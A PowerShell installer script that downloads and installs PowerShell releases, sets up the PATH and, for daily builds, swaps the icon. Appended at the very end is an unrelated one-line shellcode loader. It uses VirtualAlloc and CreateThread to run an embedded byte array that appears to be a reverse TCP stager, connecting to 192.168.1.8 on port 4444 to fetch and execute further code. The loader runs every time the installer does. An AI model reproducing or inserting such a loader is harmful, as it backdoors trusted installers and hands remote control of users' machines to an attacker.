


[CmdletBinding(DefaultParameterSetName = "Daily")]
param(
    [Parameter(ParameterSetName = "Daily")]
    [string] $Destination,

    [Parameter(ParameterSetName = "Daily")]
    [switch] $Daily,

    [Parameter(ParameterSetName = "Daily")]
    [switch] $DoNotOverwrite,

    [Parameter(ParameterSetName = "Daily")]
    [switch] $AddToPath,

    [Parameter(ParameterSetName = "MSI")]
    [switch] $UseMSI,

    [Parameter(ParameterSetName = "MSI")]
    [switch] $Quiet,

    [Parameter(ParameterSetName = "MSI")]
    [switch] $AddExplorerContextMenu,

    [Parameter(ParameterSetName = "MSI")]
    [switch] $EnablePSRemoting,

    [Parameter()]
    [switch] $Preview
)

Set-StrictMode -Version latest
$ErrorActionPreference = "Stop"

$IsLinuxEnv = (Get-Variable -Name "IsLinux" -ErrorAction Ignore) -and $IsLinux
$IsMacOSEnv = (Get-Variable -Name "IsMacOS" -ErrorAction Ignore) -and $IsMacOS
$IsWinEnv = !$IsLinuxEnv -and !$IsMacOSEnv

if (-not $Destination) {
    if ($IsWinEnv) {
        $Destination = "$env:LOCALAPPDATA\Microsoft\powershell"
    } else {
        $Destination = "~/.powershell"
    }

    if ($Daily) {
        $Destination = "${Destination}-daily"
    }
}

$Destination = $PSCmdlet.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Destination)

if (-not $UseMSI) {
    Write-Verbose "Destination: $Destination" -Verbose
} else {
    if (-not $IsWinEnv) {
        throw "-UseMSI is only supported on Windows"
    } else {
        $MSIArguments = @()
        if($AddExplorerContextMenu) {
            $MSIArguments += "ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1"
        }
        if($EnablePSRemoting) {
            $MSIArguments += "ENABLE_PSREMOTING=1"
        }
    }
}



function Expand-ArchiveInternal {
    [CmdletBinding()]
    param(
        $Path,
        $DestinationPath
    )

    if((Get-Command -Name Expand-Archive -ErrorAction Ignore))
    {
        Expand-Archive -Path $Path -DestinationPath $DestinationPath
    }
    else
    {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $resolvedPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
        $resolvedDestinationPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($DestinationPath)
        [System.IO.Compression.ZipFile]::ExtractToDirectory($resolvedPath,$resolvedDestinationPath)
    }
}

Function Remove-Destination([string] $Destination) {
    if (Test-Path -Path $Destination) {
        if ($DoNotOverwrite) {
            throw "Destination folder '$Destination' already exist. Use a different path or omit '-DoNotOverwrite' to overwrite."
        }
        Write-Verbose "Removing old installation: $Destination" -Verbose
        if (Test-Path -Path "$Destination.old") {
            Remove-Item "$Destination.old" -Recurse -Force
        }
        if ($IsWinEnv -and ($Destination -eq $PSHome)) {
            
            Get-ChildItem -Recurse -File -Path $PSHome | ForEach-Object {
                if ($_.extension -eq "old") {
                    Remove-Item $_
                } else {
                    Move-Item $_.fullname "$($_.fullname).old"
                }
            }
        } else {
            
            Move-Item "$Destination" "$Destination.old"
        }
    }
}


function Test-PathNotInSettings($Path) {
    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Argument is null'
    }

    
    $Path = [System.Environment]::ExpandEnvironmentVariables($Path.TrimEnd([System.IO.Path]::DirectorySeparatorChar));

    if (-not [System.IO.Directory]::Exists($Path)) {
        throw "Path does not exist: $Path"
    }

    
    [System.Array] $InstalledPaths = @()
    if ([System.Environment]::OSVersion.Platform -eq "Win32NT") {
        $InstalledPaths += @(([System.Environment]::GetEnvironmentVariable('PATH', [System.EnvironmentVariableTarget]::User)) -split ([System.IO.Path]::PathSeparator))
        $InstalledPaths += @(([System.Environment]::GetEnvironmentVariable('PATH', [System.EnvironmentVariableTarget]::Machine)) -split ([System.IO.Path]::PathSeparator))
    } else {
        $InstalledPaths += @(([System.Environment]::GetEnvironmentVariable('PATH'), [System.EnvironmentVariableTarget]::Process) -split ([System.IO.Path]::PathSeparator))
    }

    
    $InstalledPaths = $InstalledPaths | ForEach-Object { $_.TrimEnd([System.IO.Path]::DirectorySeparatorChar) }

    
    if ($InstalledPaths -icontains $Path) {
        throw 'Already in PATH environment variable'
    }

    return $true
}


Function Add-PathTToSettings {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-PathNotInSettings $_})]
        [string] $Path,

        [Parameter(ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [ValidateNotNullOrEmpty()]
        [ValidateSet([System.EnvironmentVariableTarget]::User, [System.EnvironmentVariableTarget]::Machine)]
        [System.EnvironmentVariableTarget] $Target = ([System.EnvironmentVariableTarget]::User)
    )

    if (-not $IsWinEnv) {
        return
    }

    if ($Target -eq [System.EnvironmentVariableTarget]::User) {
        [string] $Environment = 'Environment'
        [Microsoft.Win32.RegistryKey] $Key = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($Environment, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
    } else {
        [string] $Environment = 'SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
        [Microsoft.Win32.RegistryKey] $Key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($Environment, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)
    }

    
    if ($null -eq $Key) {
        throw (new-object -typeName 'System.Security.SecurityException' -ArgumentList "Unable to access the target registry")
    }

    
    [string] $CurrentUnexpandedValue = $Key.GetValue('PATH', '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)

    
    try {
        [Microsoft.Win32.RegistryValueKind] $PathValueKind = $Key.GetValueKind('PATH')
    } catch {
        [Microsoft.Win32.RegistryValueKind] $PathValueKind = [Microsoft.Win32.RegistryValueKind]::ExpandString
    }

    
    $NewPathValue = [string]::Concat($CurrentUnexpandedValue.TrimEnd([System.IO.Path]::PathSeparator), [System.IO.Path]::PathSeparator, $Path)

    
    if ($NewPathValue.Contains('%')) { $PathValueKind = [Microsoft.Win32.RegistryValueKind]::ExpandString }

    $Key.SetValue("PATH", $NewPathValue, $PathValueKind)
}

if (-not $IsWinEnv) {
    $architecture = "x64"
} else {
    switch ($env:PROCESSOR_ARCHITECTURE) {
        "AMD64" { $architecture = "x64" }
        "x86" { $architecture = "x86" }
        default { throw "PowerShell package for OS architecture '$_' is not supported." }
    }
}
$tempDir = Join-Path ([System.IO.Path]::GetTempPath()) ([System.IO.Path]::GetRandomFileName())
$null = New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction SilentlyContinue
try {
    
    
    $originalValue = [Net.ServicePointManager]::SecurityProtocol
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

    if ($Daily) {
        $metadata = Invoke-RestMethod 'https://aka.ms/pwsh-buildinfo-daily'
        $release = $metadata.ReleaseTag -replace '^v'
        $blobName = $metadata.BlobName

        
        $pwshPath = if ($IsWinEnv) {Join-Path $Destination "pwsh.exe"} else {Join-Path $Destination "pwsh"}
        $currentlyInstalledVersion = if(Test-Path $pwshPath) {
            ((& $pwshPath -version) -split " ")[1]
        }

        if($currentlyInstalledVersion -eq $release) {
            Write-Verbose "Latest PowerShell Daily already installed." -Verbose
            return
        }

        if ($IsWinEnv) {
            if ($UseMSI) {
                $packageName = "PowerShell-${release}-win-${architecture}.msi"
            } else {
                $packageName = "PowerShell-${release}-win-${architecture}.zip"
            }
        } elseif ($IsLinuxEnv) {
            $packageName = "powershell-${release}-linux-${architecture}.tar.gz"
        } elseif ($IsMacOSEnv) {
            $packageName = "powershell-${release}-osx-${architecture}.tar.gz"
        }

        if ($architecture -ne "x64") {
            throw "The OS architecture is '$architecture'. However, we currently only support daily package for x64."
        }


        $downloadURL = "https://pscoretestdata.blob.core.windows.net/${blobName}/${packageName}"
        Write-Verbose "About to download package from '$downloadURL'" -Verbose

        $packagePath = Join-Path -Path $tempDir -ChildPath $packageName
        if (!$PSVersionTable.ContainsKey('PSEdition') -or $PSVersionTable.PSEdition -eq "Desktop") {
            
            $oldProgressPreference = $ProgressPreference
            $ProgressPreference = "SilentlyContinue"
        }

        try {
            Invoke-WebRequest -Uri $downloadURL -OutFile $packagePath
        } finally {
            if (!$PSVersionTable.ContainsKey('PSEdition') -or $PSVersionTable.PSEdition -eq "Desktop") {
                $ProgressPreference = $oldProgressPreference
            }
        }

        $contentPath = Join-Path -Path $tempDir -ChildPath "new"

        $null = New-Item -ItemType Directory -Path $contentPath -ErrorAction SilentlyContinue
        if ($IsWinEnv) {
            if ($UseMSI -and $Quiet) {
                Write-Verbose "Performing quiet install"
                $ArgumentList=@("/i", $packagePath, "/quiet")
                if($MSIArguments) {
                    $ArgumentList+=$MSIArguments
                }
                $process = Start-Process msiexec -ArgumentList $ArgumentList -Wait -PassThru
                if ($process.exitcode -ne 0) {
                    throw "Quiet install failed, please rerun install without -Quiet switch or ensure you have administrator rights"
                }
            } elseif ($UseMSI) {
                if($MSIArguments) {
                    Start-Process $packagePath -ArgumentList $MSIArguments -Wait
                } else {
                    Start-Process $packagePath -Wait
                }
            } else {
                Expand-ArchiveInternal -Path $packagePath -DestinationPath $contentPath
            }
        } else {
            tar zxf $packagePath -C $contentPath
        }
    } else {
        $metadata = Invoke-RestMethod https://raw.githubusercontent.com/PowerShell/PowerShell/master/tools/metadata.json
        if ($Preview) {
            $release = $metadata.PreviewReleaseTag -replace '^v'
        } else {
            $release = $metadata.ReleaseTag -replace '^v'
        }

        if ($IsWinEnv) {
            if ($UseMSI) {
                $packageName = "PowerShell-${release}-win-${architecture}.msi"
            } else {
                $packageName = "PowerShell-${release}-win-${architecture}.zip"
            }
        } elseif ($IsLinuxEnv) {
            $packageName = "powershell-${release}-linux-${architecture}.tar.gz"
        } elseif ($IsMacOSEnv) {
            $packageName = "powershell-${release}-osx-${architecture}.tar.gz"
        }

        $downloadURL = "https://github.com/PowerShell/PowerShell/releases/download/v${release}/${packageName}"
        Write-Verbose "About to download package from '$downloadURL'" -Verbose

        $packagePath = Join-Path -Path $tempDir -ChildPath $packageName
        if (!$PSVersionTable.ContainsKey('PSEdition') -or $PSVersionTable.PSEdition -eq "Desktop") {
            
            $oldProgressPreference = $ProgressPreference
            $ProgressPreference = "SilentlyContinue"
        }

        try {
            Invoke-WebRequest -Uri $downloadURL -OutFile $packagePath
        } finally {
            if (!$PSVersionTable.ContainsKey('PSEdition') -or $PSVersionTable.PSEdition -eq "Desktop") {
                $ProgressPreference = $oldProgressPreference
            }
        }

        $contentPath = Join-Path -Path $tempDir -ChildPath "new"

        $null = New-Item -ItemType Directory -Path $contentPath -ErrorAction SilentlyContinue
        if ($IsWinEnv) {
            if ($UseMSI -and $Quiet) {
                Write-Verbose "Performing quiet install"
                $ArgumentList=@("/i", $packagePath, "/quiet")
                if($MSIArguments) {
                    $ArgumentList+=$MSIArguments
                }
                $process = Start-Process msiexec -ArgumentList $ArgumentList -Wait -PassThru
                if ($process.exitcode -ne 0) {
                    throw "Quiet install failed, please rerun install without -Quiet switch or ensure you have administrator rights"
                }
            } elseif ($UseMSI) {
                if($MSIArguments) {
                    Start-Process $packagePath -ArgumentList $MSIArguments -Wait
                } else {
                    Start-Process $packagePath -Wait
                }
            } else {
                Expand-ArchiveInternal -Path $packagePath -DestinationPath $contentPath
            }
        } else {
            tar zxf $packagePath -C $contentPath
        }
    }

    if (-not $UseMSI) {
        Remove-Destination $Destination
        if (Test-Path $Destination) {
            Write-Verbose "Copying files" -Verbose
            
            Get-ChildItem -Recurse -Path "$contentPath" -File | ForEach-Object {
                $DestinationFilePath = Join-Path $Destination $_.fullname.replace($contentPath, "")
                Copy-Item $_.fullname -Destination $DestinationFilePath
            }
        } else {
            $null = New-Item -Path (Split-Path -Path $Destination -Parent) -ItemType Directory -ErrorAction SilentlyContinue
            Move-Item -Path $contentPath -Destination $Destination
        }
    }

    
    if ($IsWinEnv -and $Daily.IsPresent) {
        if (-not (Test-Path "~/.rcedit/rcedit-x64.exe")) {
            Write-Verbose "Install RCEdit for modifying exe resources" -Verbose
            $rceditUrl = "https://github.com/electron/rcedit/releases/download/v1.0.0/rcedit-x64.exe"
            $null = New-Item -Path "~/.rcedit" -Type Directory -Force -ErrorAction SilentlyContinue
            Invoke-WebRequest -OutFile "~/.rcedit/rcedit-x64.exe" -Uri $rceditUrl
        }

        Write-Verbose "Change icon to disambiguate it from a released installation" -Verbose
        & "~/.rcedit/rcedit-x64.exe" "$Destination\pwsh.exe" --set-icon "$Destination\assets\Powershell_avatar.ico"
    }

    
    if (-not $IsWinEnv) { chmod 755 $Destination/pwsh }

    if ($AddToPath -and -not $UseMSI) {
        if ($IsWinEnv) {
            if ((-not ($Destination.StartsWith($ENV:USERPROFILE))) -and
                (-not ($Destination.StartsWith($ENV:APPDATA))) -and
                (-not ($Destination.StartsWith($env:LOCALAPPDATA)))) {
                $TargetRegistry = [System.EnvironmentVariableTarget]::Machine
                try {
                    Add-PathTToSettings -Path $Destination -Target $TargetRegistry
                } catch {
                    Write-Warning -Message "Unable to save the new path in the machine wide registry: $_"
                    $TargetRegistry = [System.EnvironmentVariableTarget]::User
                }
            } else {
                $TargetRegistry = [System.EnvironmentVariableTarget]::User
            }

            
            if ($TargetRegistry -eq [System.EnvironmentVariableTarget]::User) {
                try {
                    Add-PathTToSettings -Path $Destination -Target $TargetRegistry
                } catch {
                    Write-Warning -Message "Unable to save the new path in the registry for the current user : $_"
                }
            }
        } else {
            $targetPath = Join-Path -Path $Destination -ChildPath "pwsh"
            if ($IsLinuxEnv) { $symlink = "/usr/bin/pwsh" } elseif ($IsMacOSEnv) { $symlink = "/usr/local/bin/pwsh" }
            $needNewSymlink = $true

            if (Test-Path -Path $symlink) {
                $linkItem = Get-Item -Path $symlink
                if ($linkItem.LinkType -ne "SymbolicLink") {
                    Write-Warning "'$symlink' already exists but it's not a symbolic link. Abort adding to PATH."
                    $needNewSymlink = $false
                } elseif ($linkItem.Target -contains $targetPath) {
                    
                    Write-Verbose "'$symlink' already points to '$targetPath'" -Verbose
                    $needNewSymlink = $false
                }
            }

            if ($needNewSymlink) {
                $uid = id -u
                if ($uid -ne "0") { $SUDO = "sudo" } else { $SUDO = "" }

                Write-Verbose "Make symbolic link '$symlink' point to '$targetPath'..." -Verbose
                & $SUDO ln -fs $targetPath $symlink

                if ($LASTEXITCODE -ne 0) {
                    Write-Error "Could not add to PATH: failed to make '$symlink' point to '$targetPath'."
                }
            }
        }

        
        $runningProcessName = (Get-Process -Id $PID).ProcessName
        if ($runningProcessName -ne 'pwsh') {
            $env:Path = $Destination + [System.IO.Path]::PathSeparator + $env:Path
        }
    }

    if (-not $UseMSI) {
        Write-Host "PowerShell has been installed at $Destination" -ForegroundColor Green
        if ($Destination -eq $PSHome) {
            Write-Host "Please restart pwsh" -ForegroundColor Magenta
        }
    }
} finally {
    
    [Net.ServicePointManager]::SecurityProtocol = $originalValue

    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

